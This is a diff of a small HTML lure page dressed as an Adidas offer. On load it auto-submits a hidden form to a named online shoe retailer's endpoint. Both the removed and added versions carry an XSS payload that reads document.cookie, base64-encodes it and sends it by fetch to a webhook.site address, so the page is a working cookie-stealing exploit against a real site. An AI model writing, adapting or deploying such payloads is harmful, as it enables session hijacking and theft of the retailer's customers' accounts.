@@ -1,9 +1,11 @@
 <!DOCTYPE html>
 <html>
+<head><title>Oferta Exclusiva Adidas</title></head>
 <body onload="document.forms[0].submit()">
-    <h1>Cargando oferta...</h1>
-    <form action="https://www.maszapatillas.com/es/module/motive/front?action=shopperPrices" method="POST">
-        <input type="hidden" name="data" value='[{"id":"151056<img src=x onerror=\"fetch(&quot;https://webhook.site/5ca5781a-ca2d-4cbd-a614-7f20cbce4c27?data=&quot;+btoa(document.cookie))\">"}]'>
+    <h1>Cargando oferta personalizada...</h1>
+    
+    <form action="https://maszapatillas.com/es/zapatillas-mujer/47194-143055-zapatillas-adidas-spezial-.html?action=shopperPrices" method="POST" enctype="text/plain">
+        <input type="hidden" name='[{"id":"151056","js":"document.body.style.background=\"red\"; alert(\"XSS DESDE GITHUB: Sesión Comprometida\"); fetch(\"https://webhook.site/TU_ID?c=\"+btoa(document.cookie));"}]' value=''>
     </form>
 </body>
 </html>
